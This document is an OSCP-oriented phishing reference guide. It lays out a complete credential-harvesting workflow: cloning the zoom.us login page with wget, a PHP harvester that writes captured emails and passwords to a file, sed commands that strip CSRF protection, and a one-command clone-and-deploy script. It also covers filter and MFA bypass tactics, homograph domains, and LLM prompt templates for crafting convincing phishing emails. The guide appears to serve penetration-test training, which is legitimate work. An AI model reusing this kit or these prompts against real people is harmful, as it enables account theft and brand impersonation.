# 📧 Phishing Basics - Complete Reference Guide

## 🎯 Module Overview
**Purpose**: Master phishing techniques, credential harvesting, and social engineering for OSCP exam
**Key Skills**: Email phishing, website cloning, pretext development, credential capture
**Exam Relevance**: Common initial access vector in penetration tests

---

## 📚 1. Phishing Fundamentals

### 1.1 Attack Types
```
BROAD PHISHING (Mass Attacks)
├── Generic messages
├── Wide distribution
├── Low personalization
└── Volume-based success

SPEAR PHISHING (Targeted)
├── Researched targets
├── Personalized content
├── Specific objectives
└── Higher success rate

WHALING (Executive Targeting)
├── C-Suite targets
├── Highly customized
├── Significant research
└── Maximum impact
```

### 1.2 Communication Vectors
| Vector | Description | Common Use Case | Detection Risk |
|--------|-------------|-----------------|----------------|
| **Email** | Traditional phishing | Credential harvesting | Medium-High |
| **Smishing** | SMS-based attacks | Mobile targeting | Low-Medium |
| **Vishing** | Voice phishing | Social engineering | Low |
| **Chat Apps** | Discord/Slack/Teams | Internal compromise | Medium |

### 1.3 Social Engineering Principles
```
TRUST BUILDING
├── Familiar sender names
├── Company branding
├── Professional language
└── Expected context

PSYCHOLOGICAL TRIGGERS
├── Urgency: "Account expires in 24 hours"
├── Fear: "Security breach detected"
├── Authority: "CEO request"
├── Reward: "Click for $100 gift card"
└── Curiosity: "See who viewed your profile"
```

---

## 🛡️ 2. Defensive Mechanisms & Bypasses

### 2.1 Email Filters
```bash
# Common Filter Evasion Techniques
DOMAIN REPUTATION:
  - Use aged domains (>30 days old)
  - Avoid blacklisted IPs
  - Build sender reputation gradually

ATTACHMENT HANDLING:
  - Avoid .exe, .scr extensions
  - Use password-protected archives
  - Embed in Office documents
  - Leverage cloud storage links
```

### 2.2 Microsoft Office Security
```
MACRO PROTECTION TIMELINE:
2016: Macros disabled by default
2018: Protected View introduced
2022: Mark of the Web (MotW) enforcement
2023: Macros blocked with MotW

BYPASS TECHNIQUES:
├── Social engineering for manual enable
├── Alternative file formats (RTF, HTA)
├── Exploiting unpatched vulnerabilities
└── Using trusted document templates
```

### 2.3 Multi-Factor Authentication
```bash
# MFA Bypass Strategies
1. PROMPT BOMBING
   - Flood with auth requests
   - Exploit MFA fatigue

2. RELAY ATTACKS
   - Real-time token capture
   - Browser-in-the-middle

3. SOCIAL ENGINEERING
   - Helpdesk impersonation
   - Direct user contact
```

---

## 🔧 3. Practical Implementation

### 3.1 Website Cloning with wget
```bash
# Clone target website for credential phishing
wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"

# FLAGS EXPLAINED:
# -E: Adjust extensions to match MIME types
# -k: Convert links to local files
# -K: Keep original files with .orig extension
# -p: Download all page requisites
# -e robots=off: Ignore robots.txt restrictions
# -H: Enable spanning across hosts
# -Dzoom.us: Limit to specified domain
# -nd: Save in flat directory structure

# Output: Complete local copy for modification
# Troubleshooting: Check for JavaScript dependencies
```

### 3.2 Setting Up Phishing Infrastructure
```bash
# Step 1: Create working directory
mkdir ~/phishing_campaign
cd ~/phishing_campaign

# Step 2: Quick web server for testing
sudo python -m http.server 80
# Purpose: Test cloned site rendering
# Port 80: Standard HTTP (appears legitimate)

# Step 3: Production deployment with Apache
sudo cp -r * /var/www/html/
sudo systemctl start apache2
# Purpose: Handle POST requests for credentials
# Apache: Better form handling than Python server
```

### 3.3 Credential Capture PHP
```php
<?php
// custom_login.php - Credential harvester
if (isset($_POST['email']) && isset($_POST['password'])) {
    // Capture credentials
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Log to file (append mode)
    $file = 'credentials.txt';
    $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Write with locking to prevent corruption
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirect to legitimate site
    header('Location: https://zoom.us/signin#/login');
    exit();
}
?>
```

### 3.4 File Permissions Setup
```bash
# Create credential storage file
sudo touch /var/www/html/credentials.txt

# Set appropriate permissions
sudo chmod 666 credentials.txt    # Read/write for PHP
sudo chmod 755 custom_login.php   # Execute permissions

# Monitor captured credentials
tail -f /var/www/html/credentials.txt
```

---

## 🎭 4. Pretext Development

### 4.1 Research Phase
```bash
# OSINT for pretext development
1. LinkedIn reconnaissance
2. Company website analysis
3. Job postings (technology stack)
4. Social media monitoring
5. Data breach databases

# Key information to gather:
- Email format (first.last@domain)
- Department structures
- Technology vendors
- Recent company events
- Communication style
```

### 4.2 LLM-Assisted Content Creation
```
PROMPT TEMPLATE:
"Looking at the following email: [PASTE ORIGINAL]
Write another email in the same style that includes:
- Similar tone and vocabulary
- Department-specific references
- Urgency without suspicion
- Clear call to action with hyperlink"

REFINEMENT PROMPTS:
- "Make the subject line more urgent"
- "Add company-specific terminology"
- "Include a deadline of 48 hours"
```

### 4.3 Common Pretexts
| Pretext | Target Audience | Success Rate | Risk Level |
|---------|-----------------|--------------|------------|
| Password Reset | All users | High | Low |
| Zoom License | Remote workers | High | Low |
| IT Security Update | All users | Medium | Medium |
| Invoice/Payment | Finance dept | High | High |
| Package Delivery | All users | Medium | Low |
| CEO Request | Specific individuals | High | High |

---

## 🚨 5. Troubleshooting Guide

### 5.1 Common Issues & Solutions

#### Issue: Infinite loading on cloned site
```bash
# DIAGNOSIS
grep "POST" apache_access.log
# Look for failed POST requests

# SOLUTION
# Create missing endpoint handler
echo '<?php header("Location: /"); ?>' > sendUserBehavior.php

# Alternative: Remove problematic JavaScript
grep -r "sendUserBehavior" *.html
# Comment out or remove the calls
```

#### Issue: CSRF protection alerts
```bash
# DIAGNOSIS
grep "CSRF\|csrf" *.js *.html

# SOLUTION
# Remove CSRF validation code
sed -i '/csrf_js/d' signin.html

# Verify removal
grep "csrf" signin.html  # Should return nothing
```

#### Issue: Credentials not capturing
```bash
# CHECK 1: File permissions
ls -la credentials.txt
# Should show: -rw-rw-rw-

# CHECK 2: PHP error logs
sudo tail -f /var/log/apache2/error.log

# CHECK 3: Form action path
grep "action=" signin.html
# Ensure points to correct PHP handler

# FIX: Set proper permissions
sudo chown www-data:www-data credentials.txt
sudo chmod 666 credentials.txt
```

### 5.2 Testing Checklist
```bash
# Pre-deployment verification
[ ] Clone renders correctly
[ ] Forms submit properly
[ ] Credentials captured
[ ] Redirect works
[ ] HTTPS certificate valid
[ ] Domain looks legitimate
[ ] Email deliverability tested
```

---

## 📝 6. OSCP Exam Tips

### 6.1 Methodology Flow
```
1. RECONNAISSANCE
   ├── Identify email addresses
   ├── Discover naming conventions
   └── Research company culture

2. WEAPONIZATION
   ├── Clone target website
   ├── Create credential harvester
   └── Develop convincing pretext

3. DELIVERY
   ├── Send phishing email
   ├── Track click rates
   └── Monitor credential capture

4. EXPLOITATION
   ├── Use captured credentials
   ├── Establish foothold
   └── Document for report
```

### 6.2 Documentation Requirements
```bash
# Screenshot evidence needed:
1. Original phishing email sent
2. Cloned website appearance
3. Credential capture proof
4. Successful authentication

# Command logging format:
echo "[$(date)] Command: wget -E -k -K -p -e robots=off..." >> phishing_log.txt
```

### 6.3 Quick Reference Commands
```bash
# Website cloning
wget -E -k -K -p -e robots=off -H -D[domain] -nd "[URL]"

# Start web server
sudo python -m http.server 80

# Apache setup
sudo systemctl start apache2
sudo tail -f /var/log/apache2/access.log

# Monitor credentials
watch -n 1 'tail -n 20 credentials.txt'

# Email header analysis
grep -E "From:|To:|Subject:" suspicious_email.eml
```

---

## ⚡ 7. Advanced Techniques

### 7.1 Homograph URLs
```
# Unicode substitution examples
microsoft.com → microsоft.com (Cyrillic 'o')
google.com → gооgle.com (Cyrillic 'o's)
paypal.com → pаypal.com (Cyrillic 'a')

# Testing homograph domains
echo "apple.com" | od -c  # Check ASCII
echo "аррӏе.com" | od -c  # Reveal Unicode
```

### 7.2 URL Shortening & Obfuscation
```bash
# Create shortened URLs (external services)
- bit.ly
- tinyurl.com
- rebrand.ly (custom domains)

# Base64 obfuscation
echo "http://malicious.site" | base64
# Decode in JavaScript: atob("...")
```

### 7.3 Modern Evasion Techniques
```
QR CODES
├── Bypass URL inspection
├── Mobile device targeting
└── Physical placement options

OAUTH PHISHING
├── Legitimate login pages
├── App permission abuse
└── Token harvesting

BROWSER-IN-THE-MIDDLE
├── Real-time session hijacking
├── MFA token relay
└── Tools: Evilginx2, Modlishka
```

---

## 📊 8. Success Metrics

### 8.1 Campaign Effectiveness
```
METRICS TO TRACK:
├── Email open rate (>20% good)
├── Click-through rate (>10% good)
├── Credential submission (>5% good)
├── Time to first click
└── Geographic distribution

IMPROVEMENT FACTORS:
├── Pretext relevance
├── Timing of delivery
├── Visual authenticity
├── Domain reputation
└── Urgency balance
```

### 8.2 Red Flags to Avoid
```
TECHNICAL:
❌ HTTP instead of HTTPS
❌ Suspicious domains
❌ Broken images/CSS
❌ JavaScript errors
❌ Wrong fonts/colors

CONTENT:
❌ Grammar/spelling errors
❌ Generic greetings
❌ Unrealistic requests
❌ Mismatched branding
❌ Excessive urgency
```

---

## 🔄 9. Automation Scripts

### 9.1 Credential Monitor
```bash
#!/bin/bash
# monitor_creds.sh - Real-time credential monitoring

CRED_FILE="/var/www/html/credentials.txt"
LOG_FILE="/home/kali/phishing_success.log"

while true; do
    if [ -f "$CRED_FILE" ]; then
        NEW_CREDS=$(tail -n 2 "$CRED_FILE" | grep -v "^$")
        if [ ! -z "$NEW_CREDS" ]; then
            echo "[$(date)] New credentials captured:" >> "$LOG_FILE"
            echo "$NEW_CREDS" >> "$LOG_FILE"
            echo "---" >> "$LOG_FILE"
        fi
    fi
    sleep 5
done
```

### 9.2 Quick Clone & Deploy
```bash
#!/bin/bash
# quick_phish.sh - Rapid phishing site deployment

TARGET_URL=$1
DOMAIN=$(echo $TARGET_URL | cut -d'/' -f3)

# Clone site
wget -E -k -K -p -e robots=off -H -D"$DOMAIN" -nd "$TARGET_URL"

# Remove CSRF protection
find . -name "*.html" -exec sed -i '/csrf/Id' {} \;

# Deploy to Apache
sudo cp -r * /var/www/html/
sudo systemctl restart apache2

echo "Phishing site deployed at http://$(hostname -I | awk '{print $1}')"
```

---

## 🎓 10. Key Takeaways

### For OSCP Success:
1. **Always verify** credential capture before reporting
2. **Document everything** with screenshots and logs
3. **Test locally** before targeting production
4. **Understand the WHY** behind each technique
5. **Practice variations** of common pretexts

### Remember:
- Phishing = Technical skill + Social engineering
- Details matter (fonts, logos, language)
- Persistence often beats sophistication
- Always have a backup plan
- Documentation wins exams

---

## 📖 Additional Resources

### Tools:
- **SET (Social Engineer Toolkit)**: Automated phishing
- **Gophish**: Campaign management
- **Evilginx2**: Advanced MFA bypass
- **BeEF**: Browser exploitation

### Practice:
- Clone popular services (Gmail, O365, LinkedIn)
- Create pretexts for different industries
- Test against your own accounts
- Study real phishing samples

---

*Last Updated: OSCP Phishing Module Reference*
*Remember: Use these techniques only in authorized penetration tests*